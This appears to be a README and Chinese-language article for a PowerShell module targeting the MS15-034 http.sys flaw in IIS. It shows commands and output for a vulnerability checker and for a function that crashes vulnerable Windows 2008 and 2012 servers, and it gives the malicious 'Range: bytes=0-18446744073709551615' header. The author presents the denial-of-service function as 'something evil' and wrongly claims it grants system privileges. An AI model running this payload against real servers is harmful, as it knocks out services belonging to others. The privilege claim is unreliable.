# MS15034
PowerShell module for the exploitation and testing 

http://www.hx99.net/Article/Tech/201504/36652.html


星期四一早我的推特就被微软最新的ms15-034漏洞公告刷屏了.

ms15-034漏洞出在http.sys文件中.这个文件是iis的一个重要组件,功能和特性对windows来说意义重大.微软公告说这个漏洞是一个可以执行远程代码的漏洞,但是截至目前为止已发布的poc仅仅只能dos掉系统,虽然有人声称出售可以用于远程攻击的poc但是真实性值得怀疑.

过去这几出现了各种各样的poc,甚至用于攻击ms15-034的metasploit模块也出现了.如果你用类unix操作系统或者电脑里安装了诸如perlpython的脚本语言,你都可以获得相应版本的poc代码.只是,我觉得这些代码对windows管理员来说还是不够友好,我倾向于写一个powershell版本的poc.

chris campbell写的ps代码可以检测系统是否是易受攻击的,但是某些情况下这个ps代码的执行不够理想.

chris的代码有三个问题,1是他没有考虑到http 404错误的情况,第二个是不会收集http 400错误,第三个是代码有前后不匹配的问题.

我觉得仅仅用powershell来验证一个系统是否受攻击是不够的,最好是能更进一步拿下系统权限.

开始之前我们首先要明确一个问题,请不要使用.net的Webrequest类来生成http header的值,而应该用更底层的TCPClient类来实现.

我写的这个漏洞利用程序受到了Metasploit ms15034漏洞模块的影响.你可以在github上面找到这段代码 https://github.com/poshsecurity/MS15034. 其中最重要的两个函数是test-ms15-34和invoke-ms15034dos 前者是测试用的,后者执行对指定系统的dos攻击.

测试:

你需要给漏洞利用程序指定如下三个参数:

1. windows2008

2. windows2012

3. -serverPath

前两个参数代表被攻击的机器,它们会访问http://computer/welcom.png 和 http://computer/iis-85.png. 第三个参数是可选的,你可以用下面的方式使用这个参数:

1. /index.html

2. /companylogo.png

3. images/logo.jpg

让我们来看看具体的例子:

1.测试一台装了windows2008的服务器是否有漏洞。
PS C:\tools> Import-Module .\MS15034.psm1
PS C:\tools> Test-MS15034 -Computer 192.168.1.3 -Windows2008
This server is vulnerable to MS 15-034
PS C:\tools>

2. 测试一台装了windows2012的服务器是否有漏洞.
PS C:\tools> Import-Module .\MS15034.psm1
PS C:\tools> Test-MS15034 -Computer 192.168.1.2 -Windows2012
This server is vulnerable to MS 15-034
PS C:\tools>

3. 测试显示服务器不存在漏洞
PS C:\tools> Import-Module .\MS15034.psm1
PS C:\tools> Test-MS15034 -Computer 192.168.1.4 -Windows2012
This server is not vulnerable to MS 15-034
PS C:\tools>

4.使用自定义路径来测试服务器是否有漏洞
PS C:\tools> Import-Module .\MS15034.psm1
PS C:\tools> Test-MS15034 -Computer 192.168.1.3 -ServerPath "/welcome.png"
This server is vulnerable to MS 15-034
PS C:\tools>

5. 故意使用错误的系统版本来测试服务器是否有漏洞
PS C:\tools> Import-Module .\MS15034.psm1
PS C:\tools> Test-MS15034 -Computer 192.168.1.3 -Windows2012
Test-MS15034 : The provided path has not been found, check you have selected the right operating system, or specified
a valid file in -ServerPath
At line:1 char:1
+ Test-MS15034 -Computer 192.168.1.3 -Windows2012
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Write-Error], WriteErrorException
    + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorException,Test-MS15034
PS C:\tools>

6. 用自定义路径来检测一台服务器是否有漏洞（路径不存在）
PS C:\tools> Import-Module .\MS15034.psm1
PS C:\tools> Test-MS15034 -Computer 192.168.1.3 -ServerPath "/thisdoesnotexist.png"
Test-MS15034 : The provided path has not been found, check you have selected the right operating system, or specified
a valid file in -ServerPath
At line:1 char:1
+ Test-MS15034 -Computer 192.168.1.3 -ServerPath "/thisdoesnotexist.png"
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Write-Error], WriteErrorException
    + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorException,Test-MS15034
PS C:\tools>

CMDLet用指定参数来连接URL,并且连接的时候指定http header的范围是 bytes=0-18446744073709551615.如果服务器响应式http 416那么就说明此服务器是受此漏洞影响的.

接下来我们来干一点邪恶的事情,通过这个漏洞直接拿到系统的权限. invoke-ms15034dos这个函数会帮我们实现这个目的.这个函数需要的参数和上面差不多.它们两者的区别在于后者用先测试被攻击的服务器是否是有漏洞的.有漏洞它才会执行攻击.否则它仅仅是执行dos攻击.dos攻击的 http header 需要被指定为: Range: bytes=0-18446744073709551615.

1. 对windwos2012r2服务器执行拒绝服务攻击
PS C:\tools> Import-Module .\MS15034.psm1
PS C:\tools> Invoke-MS15034DOS -Computer 192.168.1.2 -Windows2012
The server is vulnerable, performing Denial Of Service
Looks like the DOS was successful
PS C:\tools>

2. 对windwos2008r2服务器执行拒绝服务攻击
PS C:\tools> Import-Module .\MS15034.psm1
PS C:\tools> Invoke-MS15034DOS -Computer 192.168.1.3 -Windows2008
The server is vulnerable, performing Denial Of Service
Looks like the DOS was successful
PS C:\tools>

3. 下面的测试是来看看 如果你攻击一台打了补丁的服务器会出现的反应.
PS C:\tools> Import-Module .\MS15034.psm1
PS C:\tools> Invoke-MS15034DOS -Computer 192.168.1.4 -Windows2012
Test-MS15034 reported the server not as vulnerable, so not performing Denial Of Service
PS C:\tools>

最后需要提醒的是,我的攻击代码只支持http,对https未做考虑.
